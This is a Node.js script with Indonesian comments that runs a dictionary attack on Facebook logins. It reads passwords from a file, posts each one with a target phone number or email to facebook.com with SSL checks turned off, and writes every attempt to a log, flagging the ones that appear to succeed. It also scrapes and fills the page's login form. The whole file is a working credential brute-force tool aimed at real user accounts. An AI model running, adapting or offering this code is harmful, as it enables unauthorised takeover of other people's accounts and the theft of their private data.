const axios = require('axios');
const cheerio = require('cheerio');
const https = require('https');
const fs = require('fs');

// Konfigurasi
const url = 'https://www.facebook.com'; // Ganti dengan URL halaman yang ingin Anda scrape
const postUrl = 'https://www.facebook.com'; // URL server untuk mengirimkan HTML yang telah diubah
const passFilePath = 'pass.txt'; // File yang berisi daftar password
const logFilePath = 'log.txt'; // File log

// Fungsi untuk mematikan validasi SSL
const agent = new https.Agent({  
    rejectUnauthorized: false
});

// Fungsi untuk mengambil HTML dari URL
async function fetchHTML(url) {
    try {
        const { data } = await axios.get(url, { httpsAgent: agent });
        return data;
    } catch (error) {
        console.error(`Error mengambil URL: ${error}`);
        return null;
    }
}

// Fungsi untuk mengirimkan HTML yang telah diubah ke server
async function postHTML(url, html) {
    try {
        const response = await axios.post(url, { html }, { httpsAgent: agent }, { timeout: 5000 });
        return response.data;
    } catch (error) {
        console.error(`Error mengirim HTML: ${error}`);
        return null;
    }
}

// Fungsi untuk memeriksa kombinasi email dan password
async function kontrol(email, password, url) {
    const formData = {
        email: email,
        pass: password
    };

    try {
        const response = await axios({
            method: 'post',
            url: url,
            data: formData,
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            httpsAgent: agent
        });

        if (response.data.includes('Home</title>')) {
            fs.appendFileSync(logFilePath, `Email: ${email}, password: ${password} - Password found\n`);
            return true;
        } else {
            fs.appendFileSync(logFilePath, `Email: ${email}, password: ${password} - Password not found\n`);
            return false;
        }
    } catch (error) {
        console.error(`Error dalam kontrol: ${error}`);
        return false;
    }
}

// Fungsi utama untuk scraping dan validasi login
async function scrapeAndValidate() {
    const email = '081234567890'; // Ganti dengan email yang ingin diuji
    const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3';

    // Ambil HTML dari URL target
    const html = await fetchHTML(url);
    if (!html) {
        console.log('Gagal mengambil HTML.');
        return;
    }

    const $ = cheerio.load(html);

    // Ambil judul halaman
    const pageTitle = $('title').text().trim();
    console.log('Judul Halaman:', pageTitle);

    // Ambil elemen input dan modifikasi nilai
    const inputs = [];
    $('input, textarea, select').each((index, element) => {
        const type = $(element).attr('type') || $(element).prop('tagName').toLowerCase();
        inputs.push({ type });

        // Contoh pengisian nilai ke dalam input
        if (type === 'text') {
            $(element).val(email);
        } else if (type === 'password') {
            $(element).val('password');
        }
    });

    // Simpan perubahan
    const updatedHTML = $.html();
    console.log('Input:', inputs);

    // Ambil elemen button
    const buttons = [];
    $('button, input[type="submit"]').each((index, element) => {
        const buttonText = $(element).text().trim();
        buttons.push(buttonText);
    });
    console.log('Button:', buttons);

    // Kirim HTML yang telah diubah ke server
    const response = await postHTML(postUrl, updatedHTML);
    console.log('Respons Server:', response);

    // Baca file password
    if (!fs.existsSync(passFilePath)) {
        console.error(`File ${passFilePath} tidak ditemukan.`);
        return;
    }

    const passwords = fs.readFileSync(passFilePath, 'utf-8').split('\n').filter(Boolean);

    // Validasi kombinasi email dan password
    for (const password of passwords) {
        const success = await kontrol(email, password, url);
        if (success) {
            console.log(`Password ditemukan: ${password}`);
            break;
        } else {
            console.log(`Password tidak ditemukan: ${password}`);
        }
    }
}

// Jalankan fungsi utama
scrapeAndValidate();